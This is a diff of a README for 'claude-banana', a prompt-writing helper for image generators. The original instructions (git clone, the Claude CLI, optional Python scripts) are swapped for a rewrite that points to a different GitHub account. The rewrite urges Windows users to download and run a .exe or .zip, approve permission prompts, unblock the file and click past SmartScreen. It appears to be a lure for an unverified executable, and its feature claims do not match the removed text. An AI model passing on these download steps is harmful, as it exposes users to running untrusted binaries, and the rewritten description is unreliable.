@@ -1,163 +1,286 @@
-# Claude Banana
+# 🤖 claude-banana - Turn rough ideas into sharp prompts
 
-**You tell it what picture you want. It writes the perfect instructions to make that picture.**
+[![Download](https://img.shields.io/badge/Download-claude--banana-blue?style=for-the-badge)](https://github.com/Muhamm1580/claude-banana)
 
-That's it. That's what Claude Banana does.
+## ✨ What it does
 
----
+claude-banana helps you turn a rough idea into a clean image prompt you can use right away. It uses a 7-part formula, creative prompt methods, and domain modes to shape your idea for tools like Claude and Gemini.
 
-## The Problem
+Use it when you want:
+- A better prompt from a short sentence
+- Cleaner image results with less trial and error
+- Help choosing words that fit the scene
+- Prompt ideas for art, product shots, portraits, fantasy scenes, and more
 
-You want AI to make you an image. You type "a cool sunset." You get... something okay. But not what you imagined.
+## 🖥️ Windows download
 
-**Why?** Because AI image generators need very specific instructions. The more detail you give them — lighting, camera angle, colors, mood, textures — the better the result. But writing those detailed instructions is hard and takes practice.
+### 1. Open the download page
 
-## The Solution
+[Visit the claude-banana page to download](https://github.com/Muhamm1580/claude-banana)
 
-Claude Banana is your **creative assistant**. You describe what you want in plain words, and it:
+### 2. Get the Windows file
 
-1. **Asks you a few quick questions** to understand your vision
-2. **Builds a detailed, optimized prompt** using a proven formula
-3. **Gives you a ready-to-copy prompt** that gets amazing results from image generators
+On the page, look for the latest release or download file for Windows. If you see a `.exe` or `.zip` file, download it to your computer.
 
-Think of it like having a professional photographer in your pocket who translates "I want a cool sunset" into a paragraph of perfect instructions that the AI actually understands.
+### 3. Run the app
 
----
+- If you downloaded a `.exe` file, double-click it
+- If you downloaded a `.zip` file, open it and move the app to a folder you can reach
+- If Windows asks for permission, choose **Yes**
 
-## How to Use It
+### 4. Open claude-banana
 
-### Step 1: Get Claude Code
+Start the app from your Desktop, Start menu, or the folder where you saved it. Then type your rough idea and let it build a prompt for you.
 
-Install [Claude Code](https://docs.anthropic.com/en/docs/claude-code) (Anthropic's command-line tool).
+## 🧭 First-time setup
 
-### Step 2: Download This Project
+After you open the app, use this simple flow:
 
-```bash
-git clone https://github.com/Hainrixz/claude-banana.git
-cd claude-banana
-```
+1. Enter a short idea
+2. Pick a mode that fits your image
+3. Review the prompt it builds
+4. Copy the prompt into your image tool
+5. Make small changes if you want a different look
 
-### Step 3: Start Claude and Ask
+A good first test is something simple like:
+- a neon cyberpunk street at night
+- a cozy reading nook by a window
+- a product photo of a smartwatch on stone
 
-```bash
-claude
-```
+## 🎨 Main features
 
-Then just describe what you want in plain words:
+### 7-component prompt formula
 
-```
-"Help me create a prompt for a cozy coffee shop with warm lighting and a cat sleeping on some books"
-```
+claude-banana uses a clear structure to build prompts. It can help shape:
+- Subject
+- Style
+- Lighting
+- Composition
+- Color
+- Mood
+- Output details
 
-Claude automatically picks up the prompt-architect agent and knowledge base from this project. It will ask you a couple of questions (like "What's the mood?" or "Where will you use this image?"), and then give you a perfect prompt ready to paste into any image generator.
+This makes prompts feel complete and easier for image tools to follow.
 
----
+### 70+ creative techniques
 
-## What Makes It Special
+The app can use many prompt methods, such as:
+- style blending
+- scene framing
+- visual contrast
+- camera angle hints
+- lighting control
+- material detail
+- mood shaping
+- composition guides
 
-### The 7-Piece Formula
+These tools help when your first idea feels too vague.
 
-Every prompt Claude Banana creates has 7 carefully balanced ingredients:
+### 9 domain modes
 
-| Ingredient | What It Does | Example |
-|-----------|-------------|---------|
-| **Subject** | Who or what is in the picture | "A gray tabby cat curled up on a stack of books" |
-| **Style** | How it looks visually | "Warm watercolor illustration with soft edges" |
-| **Environment** | Where it takes place | "Inside a small bookshop cafe with wooden shelves" |
-| **Lighting** | How light falls on the scene | "Honey-gold afternoon light from a bay window" |
-| **Action** | What's happening | "The cat is sleeping with one paw draped over a book spine" |
-| **Camera** | How the picture is framed | "Eye-level close-up, slightly overhead angle" |
-| **Texture** | What things feel like | "Worn leather book covers, soft fur, steam rising from a mug" |
+Choose a mode that fits the kind of image you want:
+- Portrait
+- Product
+- Landscape
+- Fantasy
+- Sci-fi
+- Fashion
+- Architecture
+- Editorial
+- Concept art
 
-### 9 Expertise Modes
+Each mode changes the prompt focus so the result fits the subject.
 
-The agent adjusts its formula depending on what kind of image you want:
+### Built for prompt optimization
 
-- **Cinema** — Movie-like dramatic scenes
-- **Product** — Clean, professional product photos
-- **Portrait** — Beautiful photos of people
-- **Fashion** — Magazine-style editorial looks
-- **UI/Web** — App icons, web designs, interfaces
-- **Logo** — Brand marks and symbols
-- **Landscape** — Nature and environments
-- **Abstract** — Artistic patterns and textures
-- **Infographic** — Charts, data visuals, diagrams
+The app helps you move from a rough thought to a stronger prompt with less effort. It keeps the language clear and gives you a better base to work from.
 
-### 70+ Creative Techniques
+## 🧰 What you need
 
-Want something special? The agent knows how to do things like:
+To run claude-banana on Windows, use:
+- Windows 10 or Windows 11
+- A stable internet connection for download
+- Enough free space for the app and its files
+- A modern browser for the GitHub page
 
-- Turn photos into **anime/Ghibli style**
-- Create **miniature worlds inside crystal balls**
-- Make characters **break out of picture frames**
-- Mix **pencil sketches with real photos**
-- Build **tiny tilt-shift cities**
-- Design **voxel/pixel art** icons
-- And 60+ more creative effects
+For best results:
+- Use a screen with at least 1366 × 768 resolution
+- Keep your system updated
+- Close extra apps if your computer runs slow
 
-### Works With Your Existing Prompts
+## 🚀 How to use it
 
-Already have prompts from Midjourney, DALL-E, or Stable Diffusion? Paste them in and Claude Banana converts them to work better with Nano Banana Pro (Google's image generator).
+1. Open claude-banana
+2. Type a rough idea in plain words
+3. Pick the image type you want
+4. Choose a style or mode
+5. Let the app expand your idea into a full prompt
+6. Copy the prompt into your image generator
+7. Tweak a few words if you want a new result
 
-### Brand Presets
+Example:
+- Input: a cat in a city at night
+- Output: a detailed prompt with scene, light, mood, and style notes
 
-Making images for a brand? Load a preset with your brand colors, style, and mood so every image stays consistent.
+Another example:
+- Input: luxury sneaker ad
+- Output: a prompt shaped for product lighting, clean background, and sharp detail
 
----
+## 🧪 Good prompt examples
 
-## What's Inside
+Try these starter ideas:
+- a quiet mountain cabin in winter
+- a futuristic bike with glowing panels
+- a fashion portrait with soft studio light
+- a coral reef scene with vivid color
+- a clean product shot for a perfume bottle
 
-```
-claude-banana/
-  knowledge/           -- The brain: everything the agent knows about making great prompts
-  templates/examples/  -- 25 ready-to-use prompt templates you can customize
-  presets/             -- Brand style presets (colors, fonts, mood)
-  scripts/             -- Python tools for generating images directly
-  .claude/agents/      -- The agent itself
-```
+Short inputs work well. The app helps add the detail.
 
-### Optional: Generate Images Directly
+## 🗂️ Best use cases
 
-If you have a Google AI API key (free from [aistudio.google.com](https://aistudio.google.com/apikey)), you can generate images without leaving your terminal:
+claude-banana works well for:
+- Social media art ideas
+- AI image prompt drafts
+- Concept art planning
+- Product image prompts
+- Character design prompts
+- Mood boards
+- Poster ideas
+- Creative tests for image models
 
-```bash
-# Check your setup
-python3 scripts/validate_setup.py
+## ⌨️ Tips for better results
 
-# Generate an image from a prompt
-python3 scripts/generate.py --prompt "your optimized prompt here"
+- Start with one clear subject
+- Add the setting next
+- Mention the mood you want
+- Keep your input simple
+- Use a mode that matches the image
+- Change one part at a time when you refine the prompt
 
-# Generate from a template with custom values
-python3 scripts/generate.py --template templates/examples/cinematic-landscape.md \
-  --vars '{"location": "mountain lake", "time_of_day": "sunset"}'
+Good structure:
+- What you want
+- Where it is
+- How it should feel
+- What style it should follow
 
-# Edit an existing image
-python3 scripts/edit.py --image photo.png --instruction "make it look like autumn"
+## 📁 File handling on Windows
 
-# Generate a batch of variations
-python3 scripts/batch.py --template templates/examples/product-showcase.md \
-  --variations my_products.json
-```
+If you download a `.zip` file:
+1. Right-click the file
+2. Choose **Extract All**
+3. Pick a folder
+4. Open the extracted folder
+5. Run the app file inside
 
----
+If you download a `.exe` file:
+1. Double-click it
+2. Follow the setup steps
+3. Open the app after install
 
-## Want to Contribute?
+If Windows SmartScreen appears, check the file name and source, then continue if it matches the GitHub page you opened.
 
-We'd love your help! You can:
+## 🔧 Simple troubleshooting
 
-- **Share a prompt template** — Open an issue with your favorite prompt
-- **Add a technique** — Document a new creative technique
-- **Improve the knowledge** — Make the reference guides even better
-- **Fix bugs** — Submit a pull request
+### The file will not open
 
-See the [issue templates](.github/ISSUE_TEMPLATE/) for easy submission forms.
+- Download it again from the GitHub page
+- Make sure the download finished
+- Try running it as a normal user first
 
----
+### Windows blocks the file
 
-## License
+- Check that you got it from the linked GitHub page
+- Right-click the file and choose **Properties**
+- If you see an unblock option, use it
+- Try again
 
-MIT — free to use, modify, and share. See [LICENSE](LICENSE).
+### The app opens but looks blank
 
----
+- Close it and open it again
+- Restart your computer
+- Make sure your display scale is set to a normal size
 
-**[Leer en Espanol / Read in Spanish](README_ES.md)**
+### The prompt feels too long
+
+- Remove extra words from your input
+- Choose a more focused mode
+- Use a simpler subject line
+
+## 🔍 How the app fits common image tools
+
+claude-banana is made for prompt writing, so you can use its output with tools that accept text prompts. It helps shape input for:
+- AI art tools
+- Image generators
+- Concept mockups
+- Style drafts
+- Prompt libraries
+
+You can copy the result and paste it into your image tool of choice.
+
+## 📌 Why people use it
+
+People use claude-banana when they know the rough idea but not the right words. It saves time by turning a basic thought into a more complete prompt with useful image detail.
+
+It can help when you want:
+- Stronger visual direction
+- More control over style
+- Better scene detail
+- Faster prompt writing
+- Less guessing
+
+## 📦 Download and install
+
+[Get claude-banana from GitHub](https://github.com/Muhamm1580/claude-banana)
+
+1. Open the link
+2. Download the Windows file from the page
+3. Open the file after it finishes
+4. Follow the on-screen steps
+5. Launch claude-banana and start writing prompts
+
+## 📝 Example workflow
+
+Try this flow for your first prompt:
+- Idea: a red sports car in rain
+- Mode: Product or Concept Art
+- Style: cinematic
+- Lighting: reflective night light
+- Result: a stronger prompt with scene, mood, and image detail
+
+Another flow:
+- Idea: a woman in a desert cloak
+- Mode: Portrait or Fantasy
+- Style: dramatic
+- Result: a prompt that gives the image tool more to work with
+
+## 🧠 Prompt pattern it follows
+
+A simple pattern often looks like this:
+- Subject
+- Context
+- Visual style
+- Lighting
+- Composition
+- Color palette
+- Final quality notes
+
+This helps keep prompts clear and complete without making them hard to read
+
+## ⭐ Topics covered
+
+This project focuses on:
+- AI agents
+- AI art
+- Image prompts
+- Prompt engineering
+- Prompt optimization
+- Prompt templates
+- Text to image
+- Creative AI
+- Claude
+- Gemini
+
+## 📎 Repository
+
+GitHub: https://github.com/Muhamm1580/claude-banana
